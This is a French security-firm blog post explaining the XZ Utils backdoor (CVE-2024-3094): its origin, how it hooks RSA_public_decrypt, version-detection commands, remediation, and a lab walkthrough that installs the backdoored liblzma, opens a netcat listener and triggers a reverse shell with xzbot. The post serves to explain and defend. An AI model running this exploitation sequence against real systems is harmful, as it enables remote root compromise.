<!DOCTYPE html>
<html lang="fr">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>XZ Utils : la backdoor faisant trembler le monde libre et de la cybersécurité - Trackflaw | Expert en sécurité informatique</title><meta name="Description" content="XZ Utils possède une backdoor importante dans sa dernière version 5.6.0 et 5.6.1. Son exploitation n&#39;est cependant pas triviale."><meta property="og:url" content="http://localhost:1313/xz-utils--la-backdoor-faisant-trembler-le-monde-libre/">
  <meta property="og:site_name" content="Trackflaw | Expert en sécurité informatique">
  <meta property="og:title" content="XZ Utils : la backdoor faisant trembler le monde libre et de la cybersécurité">
  <meta property="og:description" content="XZ Utils possède une backdoor importante dans sa dernière version 5.6.0 et 5.6.1. Son exploitation n&#39;est cependant pas triviale.">
  <meta property="og:locale" content="fr">
  <meta property="og:type" content="article">
  <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-04-01T10:21:17+01:00">
    <meta property="article:modified_time" content="2024-04-01T10:21:17+01:00">
    <meta property="article:tag" content="Test D&#39;intrusion">
    <meta property="article:tag" content="Pentest">
    <meta property="article:tag" content="Audit">
    <meta property="og:image" content="http://localhost:1313/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/logo.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://localhost:1313/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/logo.png"><meta name="twitter:title" content="XZ Utils : la backdoor faisant trembler le monde libre et de la cybersécurité">
<meta name="twitter:description" content="XZ Utils possède une backdoor importante dans sa dernière version 5.6.0 et 5.6.1. Son exploitation n&#39;est cependant pas triviale.">
      <meta name="twitter:site" content="@trackflaw">
<meta name="application-name" content="Trackflaw | Expert en sécurité offensive">
<meta name="apple-mobile-web-app-title" content="Trackflaw | Expert en sécurité offensive"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/xz-utils--la-backdoor-faisant-trembler-le-monde-libre/" /><link rel="prev" href="http://localhost:1313/pourquoi-faire-un-test-intrusion-sur-son-site-wordpress/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "XZ Utils : la backdoor faisant trembler le monde libre et de la cybersécurité",
        "inLanguage": "fr",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/localhost:1313\/xz-utils--la-backdoor-faisant-trembler-le-monde-libre\/"
        },"image": ["http:\/\/localhost:1313\/images\/logo.png"],"genre": "posts","keywords": "Test d\u0027intrusion, Pentest, Audit","wordcount":  1048 ,
        "url": "http:\/\/localhost:1313\/xz-utils--la-backdoor-faisant-trembler-le-monde-libre\/","datePublished": "2024-04-01T10:21:17+01:00","dateModified": "2024-04-01T10:21:17+01:00","publisher": {
            "@type": "Organization",
            "name": "Thibaud Robin - Trackflaw","logo": "http:\/\/localhost:1313\/images\/logo.png"},"author": {
                "@type": "Person",
                "name": "Thibaud Robin"
            },"description": "XZ Utils possède une backdoor importante dans sa dernière version 5.6.0 et 5.6.1. Son exploitation n'est cependant pas triviale."
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Trackflaw | Expert en sécurité informatique"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/images/logo3.png"
        data-srcset="/images/logo3.png, /images/logo3.png 1.5x, /images/logo3.png 2x"
        data-sizes="auto"
        alt="/images/logo3.png"
        title="/images/logo3.png" />TRACKFLAW</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Articles"> Articles </a><a class="menu-item" href="/news/" title="Actualités"> Actualités </a><a class="menu-item" href="/about/" title="A propos"> A propos </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Rechercher des titres, des contenus..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Rechercher">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clair">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Changer de thème">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a><a href="javascript:void(0);" class="menu-item language" title="Choisir la langue">
                    <i class="fa fa-globe" aria-hidden="true"></i>                      
                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/xz-utils--la-backdoor-faisant-trembler-le-monde-libre/" selected>Français</option></select>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Trackflaw | Expert en sécurité informatique"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/images/logo3.png"
        data-srcset="/images/logo3.png, /images/logo3.png 1.5x, /images/logo3.png 2x"
        data-sizes="auto"
        alt="/images/logo3.png"
        title="/images/logo3.png" />TRACKFLAW</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Rechercher des titres, des contenus..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Rechercher">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clair">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Annuler
                    </a>
                </div><a class="menu-item" href="/posts/" title="Articles">Articles</a><a class="menu-item" href="/news/" title="Actualités">Actualités</a><a class="menu-item" href="/about/" title="A propos">A propos</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Changer de thème">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a><a href="javascript:void(0);" class="menu-item" title="Choisir la langue">
                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>
                    <select class="language-select" onchange="location = this.value;"><option value="/xz-utils--la-backdoor-faisant-trembler-le-monde-libre/" selected>Français</option></select>
                </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contenu</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">XZ Utils : la backdoor faisant trembler le monde libre et de la cybersécurité</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author">
                    <a href="https://www.linkedin.com/in/thibaud-robin/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="thibaud-picture-big" aria-hidden="true"></i>Thibaud Robin</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="01/04/2024">01/04/2024</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1048 mots&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
        </div><div class="featured-image"><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/logo.png"
        data-srcset="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/logo.png, /images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/logo.png 1.5x, /images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/logo.png 2x"
        data-sizes="auto"
        alt="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/logo.png"
        title="XZ Utils possède une backdoor importante dans sa dernière version 5.6.0 et 5.6.1. Son exploitation n&#39;est cependant pas triviale." /></div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contenu</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#tldr">TL;DR</a></li>
    <li><a href="#lorigine">L&rsquo;origine</a></li>
    <li><a href="#détails-techniques">Détails techniques</a></li>
    <li><a href="#exploitation">Exploitation</a>
      <ul>
        <li><a href="#détection">Détection</a></li>
        <li><a href="#pas-à-pas">Pas à pas</a></li>
      </ul>
    </li>
    <li><a href="#les-risques">Les risques</a></li>
    <li><a href="#correction">Correction</a></li>
    <li><a href="#démo">Démo</a></li>
    <li><a href="#en-conclusion">En conclusion</a></li>
    <li><a href="#sources">Sources</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h1 id="-nouvelle-et-sulfureuse-porte-dérobée-dans-xz-utils-sur-linux">🕶️ Nouvelle et sulfureuse porte dérobée dans XZ Utils sur Linux</h1>
<h2 id="introduction">Introduction</h2>
<p>Le <strong>29 mars 2024</strong>, une faille de sécurité majeure a été découverte dans <code>XZ Utils</code>, un paquet largement utilisé dans les distributions Linux populaires. Cette faille, connue sous le nom de <strong>CVE-2024-3094</strong>, permet aux attaquants <strong>d&rsquo;exécuter du code à distance</strong> sur les systèmes affectés.</p>
<h2 id="tldr">TL;DR</h2>
<p>La <strong>CVE-2024-3094</strong> introduit un backdoor dans le serveur OpenSSH, permettant à des attaquants en possession d&rsquo;une clef privée <strong>UNIQUE</strong> de lancer des commandes avant l&rsquo;étape d&rsquo;authentification.</p>
<ul>
<li>Cette porte dérobée <strong>n&rsquo;est pas utilisable</strong> sans posséder la clef privée adéquat.</li>
<li>La clef privée adéquat n&rsquo;est pas <strong>publique</strong>.</li>
<li>Elle permet d&rsquo;exécuter des commandes en tant qu&rsquo;utilisateur <code>root</code>.</li>
<li>Un patch est <strong>disponible</strong>.</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/1.png"
        data-srcset="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/1.png, /images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/1.png 1.5x, /images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/1.png 2x"
        data-sizes="auto"
        alt="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/1.png"
        title="XZ Utils" /></p>
<h2 id="lorigine">L&rsquo;origine</h2>
<p>L&rsquo;origine de cette faille provient d&rsquo;un individu nommé <strong>Jia Tan</strong> ayant rejoint le projet XZ Utils en <strong>2022</strong>. Au fil du temps, il acquis la confiance des autres contributeurs et obtenu des permissions de plus en plus importantes, lui permettant de publier de <strong>nouvelles versions du logiciel</strong>.</p>
<p>C&rsquo;est dans les versions <code>5.6.0</code> et <code>5.6.1</code> de <code>XZ Utils</code> que <strong>Jia Tan</strong> introduit une porte dérobée, un code malveillant capable de prendre le contrôle des systèmes affectés. Ce code, absent dans le dépôt public du projet, a été ajouté uniquement dans les versions compressées du code source téléchargeables par les utilisateurs sur GitHub.</p>
<p>Le fonctionnement de la porte dérobée est <strong>très complexe</strong> et repose sur plusieurs techniques pour échapper à la détection. Elle utilise notamment des fonctions spécifiques du <strong>compilateur</strong>, des <strong>fichiers cachés</strong> et des <strong>scripts exécutés pendant la compilation</strong> de la librairie <code>XZ Utils</code>.</p>
<p>🎯 Son objectif final est de remplacer une fonction de la librairie <strong>SSH</strong>, permettant aux attaquants de se connecter au système <strong>sans authentification</strong> et d&rsquo;exécuter n&rsquo;importe quelle commande.</p>
<h2 id="détails-techniques">Détails techniques</h2>
<p>La technicité de la porte dérobée est fascinante et utilise un système ingénieux pour contourner l&rsquo;authentification :</p>
<ol>
<li>Les fonctionnalités malveillantes se situent (dans les grandes lignes) dans le fichier <code>/usr/lib/liblzma.so.5.6.1</code>.</li>
<li>La charge détourne la fonction <code>RSA_public_decrypt</code> utilisé pour la vérification de signature.</li>
<li>Le code malveillant examine ensuite le module public <code>RSA</code> (modulo n) transmis dans la structure <code>RSA</code> (4e argument de <code>RSA_public_decrypt</code>). Cette valeur est communiquée par l&rsquo;attaquant lors de l&rsquo;authentification SSH.</li>
<li>La backdoor déchiffre et vérifie la signature via une clef publique ED448 (ci-dessous)</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0a 31 fd 3b 2f 1f c6 92 92 68 32 52 c8 c1 ac 28
</span></span><span class="line"><span class="cl">34 d1 f2 c9 75 c4 76 5e b1 f6 88 58 88 93 3e 48
</span></span><span class="line"><span class="cl">10 0c b0 6c 3a be 14 ee 89 55 d2 45 00 c7 7f 6e
</span></span><span class="line"><span class="cl">20 d3 2c 60 2b 2c 6d 31 00
</span></span></code></pre></td></tr></table>
</div>
</div><ol start="5">
<li>Uniquement l&rsquo;attaquant possède la clef privée liée à cette clef publique</li>
<li>Si la signature est valide, la commande envoyée par l&rsquo;attaquant est passé dans <code>system()</code> et exécutée en tant que <code>root</code>.</li>
</ol>
<div class="details admonition tips open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-pencil-alt fa-fw" aria-hidden="true"></i>Plus d&#39;infos !<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">Si vous souhaitez plus de détails techniques, vous pouvez consulter l&rsquo;excellent article de <a href="https://jfrog.com/blog/xz-backdoor-attack-cve-2024-3094-all-you-need-to-know/" target="_blank" rel="noopener noreffer ">https://jfrog.com/blog/xz-backdoor-attack-cve-2024-3094-all-you-need-to-know/</a></div>
        </div>
    </div>
<h2 id="exploitation">Exploitation</h2>
<p>Du coup, la grande question ! Est-ce facilement exploitable ? La réponse est <strong>NON</strong>.</p>
<h3 id="détection">Détection</h3>
<p>Pour commencer, vous pouvez utiliser la commande ci-dessous pour vérifier que vous soyez vulnérable :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">strings <span class="sb">`</span>which xz<span class="sb">`</span> <span class="p">|</span> grep <span class="s1">&#39;5\.6\.[01]&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">XZ_5.6.0
</span></span><span class="line"><span class="cl">xz <span class="o">(</span>XZ Utils<span class="o">)</span> 5.6.1
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ci-dessous une autre commande attestant de votre vulnérabilité :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">strings <span class="sb">`</span>which xz<span class="sb">`</span> <span class="p">|</span> grep <span class="s1">&#39;5\.6\.[01]&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">xz <span class="o">(</span>XZ Utils<span class="o">)</span> 5.6.1
</span></span></code></pre></td></tr></table>
</div>
</div><p>Dans un autre cas, une machine saine ne retournera rien.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">strings <span class="sb">`</span>which xz<span class="sb">`</span> <span class="p">|</span> grep <span class="s1">&#39;5\.6\.[01]&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pas-à-pas">Pas à pas</h3>
<p>L&rsquo;exploitation n&rsquo;est pas très complexe. Or, il faut garder en tête que son exploitation de masse n&rsquo;est pas possible car <strong>vous ne connaissez pas la clef privée de l&rsquo;attaquant.</strong></p>
<p>Dans notre laboratoire, nous allons modifier la clef publique de l&rsquo;attaquant par la notre afin de garantir la bonne signature.</p>
<p>Pour commencer, il est nécessaire d&rsquo;installer la version vulnérable sur la machine à exploiter.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt remove xz-utils
</span></span><span class="line"><span class="cl">wget https://snapshot.debian.org/archive/debian/20240328T025657Z/pool/main/x/xz-utils/liblzma5_5.6.1-1_amd64.deb
</span></span><span class="line"><span class="cl">dpkg -i liblzma5_5.6.1-1_amd64.deb 
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo1.png"
        data-srcset="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo1.png, /images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo1.png 1.5x, /images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo1.png 2x"
        data-sizes="auto"
        alt="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo1.png"
        title="alt text" /></p>
<p>Vérifiez que vous soyez bien vulnérable avec la commande :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">xz -V                                
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">xz <span class="o">(</span>XZ Utils<span class="o">)</span> 5.6.1
</span></span><span class="line"><span class="cl">liblzma 5.6.1
</span></span></code></pre></td></tr></table>
</div>
</div><p>Localisez et modifiez la signature de la backdoor :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo find / -name <span class="s2">&#34;liblzma.so.5.6.1&#34;</span> 2&gt; /dev/null
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1</span>
</span></span><span class="line"><span class="cl">                                                                                                                   
</span></span><span class="line"><span class="cl">shasum -a <span class="m">256</span> /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 605861f833fc181c7cdcabd5577ddb8989bea332648a8f498b4eef89b8f85ad4  /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="details admonition tips open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-pencil-alt fa-fw" aria-hidden="true"></i>Plus d&#39;infos !<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">Si vous souhaitez de l&rsquo;aide sur cette étape : <a href="https://github.com/amlweems/xzbot" target="_blank" rel="noopener noreffer ">https://github.com/amlweems/xzbot</a></div>
        </div>
    </div>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo2.png"
        data-srcset="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo2.png, /images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo2.png 1.5x, /images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo2.png 2x"
        data-sizes="auto"
        alt="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo2.png"
        title="alt text" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo3.png"
        data-srcset="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo3.png, /images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo3.png 1.5x, /images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo3.png 2x"
        data-sizes="auto"
        alt="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo3.png"
        title="alt text" /></p>
<p>Activez le service <code>SSH</code> :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo systemctl start ssh
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo4.png"
        data-srcset="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo4.png, /images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo4.png 1.5x, /images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo4.png 2x"
        data-sizes="auto"
        alt="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo4.png"
        title="alt text" /></p>
<p>Construisez le binaire du PoC et ouvrez un listener <code>netcat</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">go build .
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Autre terminal</span>
</span></span><span class="line"><span class="cl">nc -lvp <span class="m">4444</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo5.png"
        data-srcset="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo5.png, /images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo5.png 1.5x, /images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo5.png 2x"
        data-sizes="auto"
        alt="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo5.png"
        title="alt text" /></p>
<p>Déclenchez la backdoor avec la commande <code>xzbot -addr 127.0.0.1 -cmd '&lt;command&gt;'</code>. L&rsquo;exemple ci-dessous permet de déclencher l&rsquo;exécution d&rsquo;un reverse shell.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo6.png"
        data-srcset="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo6.png, /images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo6.png 1.5x, /images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo6.png 2x"
        data-sizes="auto"
        alt="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo6.png"
        title="alt text" /></p>
<p>Enfin, certains articles parlent de la présence d&rsquo;un KillSwitch via la variable d&rsquo;environnement <code>yolAbejyiejuvnup=Evjtgvsh5okmkAvj</code>. Cela ne semble avoir aucun effet 🤔</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo7.png"
        data-srcset="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo7.png, /images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo7.png 1.5x, /images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo7.png 2x"
        data-sizes="auto"
        alt="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo7.png"
        title="alt text" /></p>
<h2 id="les-risques">Les risques</h2>
<p>🤔 Il y a t&rsquo;il un risque pour ma société ?</p>
<p><strong>Oui mais assez faible !</strong></p>
<p>Comme vu dans l&rsquo;article au dessus, il n&rsquo;est pas possible d&rsquo;utiliser la backdoor <strong>sans posséder la clef privée</strong>. Uniquement l&rsquo;attaquant à l&rsquo;origine de la backdoor est en mesure de l&rsquo;utiliser.</p>
<p>Or, à ce jour nous ne savons pas qui est l&rsquo;acteur réel de ce code malveillant. Pas précaution, il est donc fortement conseillé de corriger ses instances</p>
<h2 id="correction">Correction</h2>
<p>La correction est assez simple. Il existe 2 solutions :</p>
<ul>
<li>Passer en version <code>5.6.1-r2</code>.</li>
<li>Redescendre en version <code>5.4.6</code>.</li>
</ul>
<p>Exemple générique de mise à jour sur un système <code>Debian</code> :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo apt update <span class="o">&amp;&amp;</span> sudo apt-dist upgrade -y
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="démo">Démo</h2>
<p>Petite démonstration ci-dessous pour présenter l&rsquo;exploitation de la vulnérabilité sur une machine vierge vulnérable.</p>
<p><video src="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/exploit.mp4" controls autoplay loop title="Exploitation de la backdore XZ Utils" style="width:100%"></video></p>
<h2 id="en-conclusion">En conclusion</h2>
<p>L&rsquo;attaque par porte dérobée dans <code>XZ Utils</code> est un exemple frappant des dangers liés aux logiciels libres. La confiance accordée aux contributeurs est essentielle, mais elle ne doit pas empêcher la mise en place de mesures de sécurité pour prévenir ce genre d&rsquo;incident.</p>
<p>Dans le cas de l&rsquo;attaque <code>XZ Utils</code>, des tests d&rsquo;intrusion réguliers auraient pu permettre de détecter la porte dérobée à un stade précoce.</p>
<ul>
<li><strong>Analyse du code source</strong>: des auditeurs auraient pu analyser le code source de <code>XZ Utils</code> pour identifier des anomalies ou des vulnérabilités potentielles.</li>
<li><strong>Tests d&rsquo;intrusion</strong>: des tests d&rsquo;intrusions complets auraient pu être réalisés pour identifier d&rsquo;autres failles de sécurité dans le système.</li>
</ul>
<p><strong>Trackflaw</strong> est en mesure de vous accompagner sur ces étapes cruciales, prenez contact avec nous ! 👋</p>
<h2 id="sources">Sources</h2>
<ul>
<li><a href="https://www.akamai.com/blog/security-research/critical-linux-backdoor-xz-utils-discovered-what-to-know" target="_blank" rel="noopener noreffer ">https://www.akamai.com/blog/security-research/critical-linux-backdoor-xz-utils-discovered-what-to-know</a></li>
<li><a href="https://jfrog.com/blog/xz-backdoor-attack-cve-2024-3094-all-you-need-to-know/" target="_blank" rel="noopener noreffer ">https://jfrog.com/blog/xz-backdoor-attack-cve-2024-3094-all-you-need-to-know/</a></li>
<li><a href="https://github.com/amlweems/xzbot" target="_blank" rel="noopener noreffer ">https://github.com/amlweems/xzbot</a></li>
